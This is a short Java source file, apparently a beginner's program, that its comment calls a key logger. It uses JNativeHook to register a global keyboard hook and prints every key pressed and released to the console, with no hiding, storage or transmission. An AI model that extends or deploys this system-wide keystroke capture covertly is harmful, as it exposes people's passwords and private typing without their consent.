import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 * Main THis is key Logger Program The data are coming in log
 */
public class Main implements NativeKeyListener  {

    public static void main(String[] args) {
        
        try{
            GlobalScreen.registerNativeHook();
        }
        catch(NativeHookException e){
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new Main());
    }
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }
    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

    }

}
